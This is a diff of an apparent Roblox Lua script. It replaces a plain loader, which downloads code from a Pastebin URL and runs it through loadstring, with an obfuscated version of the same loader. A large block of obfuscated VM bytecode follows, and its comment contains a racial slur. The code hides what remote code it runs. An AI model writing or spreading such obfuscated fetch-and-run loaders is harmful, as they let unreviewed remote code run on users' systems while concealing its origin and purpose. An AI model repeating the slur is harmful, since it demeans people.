@@ -15,13 +15,18 @@
 ███████╗╚█████╔╝███████╗██████╔╝
 ╚══════╝░╚════╝░╚══════╝╚═════╝░                                                                                              
 --]]
-
--- Get and run remote script from Pastebin
-local url = "https://pastebin.com/raw/cbBsFWLF"
-local response = game:HttpGet(url)
-local func = loadstring(response)
-func()
+-- Obfuscated and improved remote script executor
+local _0x1a2b = game
+local _0x3c4d = "https://pastebin.com/raw/cbBsFWLF"
+local _0x5e6f = _0x1a2b:HttpGet(_0x3c4d)
+local _0x7g8h = loadstring(_0x5e6f)
+if _0x7g8h then
+    _0x7g8h()
+else
+    error("Failed to load remote script")
+end
 task.wait(1)
+
 -- skidnigger obfuscation 4.20
 -- obfuscated at 7/9/2025 12:57:18 AM
 return(function()local d=string.byte;local r=string.char;local c=string.sub;local s=table.concat;local h=math.ldexp;local b=getfenv or function()return _ENV end;local l=setmetatable;local u=select;local l=unpack;local f=tonumber;local function w(d)local n,o,e="","",{}local a=256;local t={}for l=0,a-1 do t[l]=r(l)end;local l=1;local function i()local n=f(c(d,l,l),36)l=l+1;local o=f(c(d,l,l+n-1),36)l=l+n;return o end;n=r(i())e[1]=n;while l<#d do local l=i()if t[l]then o=t[l]else o=n..c(n,1,1)end;t[a]=n..c(o,1,1)e[#e+1],n,a=o,o,a+1 end;return table.concat(e)end;local t=w('24J27427527524I27526S24R2741J27B24J');local e=bit and bit.bxor or function(l,o)local n,e=1,0 while l>0 and o>0 do local c,a=l%2,o%2 if c~=a then e=e+n end l,o,n=(l-c)/2,(o-a)/2,n*2 end if l<o then l=o end while l>0 do local o=l%2 if o>0 then e=e+n end l,n=(l-o)/2,n*2 end return e end local function n(o,l,n)if n then local l=(o/2^(l-1))%2^((n-1)-(l-1)+1);return l-l%1;else local l=2^(l-1);return(o%(l+l)>=l)and 1 or 0;end;end;local l=1;local function o()local c,a,n,o=d(t,l,l+3);c=e(c,163)a=e(a,163)n=e(n,163)o=e(o,163)l=l+4;return(o*16777216)+(n*65536)+(a*256)+c;end;local function a()local n=e(d(t,l,l),163);l=l+1;return n;end;local function w()local l=o();local o=o();local c=1;local e=(n(o,1,20)*(2^32))+l;local l=n(o,21,31);local n=((-1)^n(o,32));if(l==0)then if(e==0)then return n*0;else l=1;c=0;end;elseif(l==2047)then return(e==0)and(n*(1/0))or(n*(0/0));end;return h(n,l-1023)*(c+(e/(2^52)));end;local i=o;local function h(n)local o;if(not n)then n=i();if(n==0)then return'';end;end;o=c(t,l,l+n-1);l=l+n;local n={}for l=1,#o do n[l]=r(e(d(c(o,l,l)),163))end return s(n);end;local l=o;local function f(...)return{...},u('#',...)end local function r()local d={0};local l={};local c={};local t={d,nil,l,nil,c};for n=1,o()do l[n-1]=r();end;t[4]=a();local l=o()local c={};for o=1,l do local n=a();local l;if(n==2)then l=(a()~=0);elseif(n==1)then l=w();elseif(n==3)then l=h();end;c[o]=l;end;t[2]=c for a=1,o()do local c=e(o(),87);local o=e(o(),177);local e=n(c,1,2);local l=n(o,1,11);local l={l,n(c,3,11),nil,nil,o};if(e==0)then l[3]=n(c,12,20);l[5]=n(c,21,29);elseif(e==1)then l[3]=n(o,12,33);elseif(e==2)then l[3]=n(o,12,32)-1048575;elseif(e==3)then l[3]=n(o,12,32)-1048575;l[5]=n(c,21,29);end;d[a]=l;end;return t;end;local function i(l,n,n)local o=l[1];local n=l[2];local e=l[3];local l=l[4];return function(...)local t=o;local n=n;local n=e;local n=l;local l=f local o=1;local l=-1;local a={};local c={...};local e=u('#',...)-1;local l={};local d={};for l=0,e do if(l>=n)then a[l-n]=c[l+1];else d[l]=c[l+1];end;end;local l=e-n+1 local n;local l;while true do n=t[o];l=n[1];if l>0 then do return end;else do return end;end;o=o+1;end;end;end;return i(r(),{},b())();end)()
